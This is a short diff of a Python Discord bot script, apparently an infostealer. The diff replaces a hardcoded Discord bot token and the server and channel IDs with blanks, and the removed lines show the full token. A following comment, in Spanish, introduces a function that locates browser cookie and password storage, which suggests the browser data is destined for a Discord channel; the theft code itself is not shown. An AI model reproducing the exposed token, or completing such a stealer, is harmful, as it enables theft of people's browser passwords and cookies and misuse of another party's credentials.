@@ -6,9 +6,9 @@ import json
 import discord
 from discord.ext import commands
 
-TOKEN = "MTMxMDk4NDgxNjA0MDIxNDU4OQ.GOvKp2.20cJ3Kkm1dg0tiNTvfsHX9c4v-HdHPCepCZHIQ"
-GUILD_ID = 870347825937018882
-CHANNEL_ID = 1310986733093130261
+TOKEN = ""
+GUILD_ID = #enter id
+CHANNEL_ID = #enter id
 
 # Función para detectar navegadores y sus rutas de cookies y contraseñas
 def get_browser_data_paths():
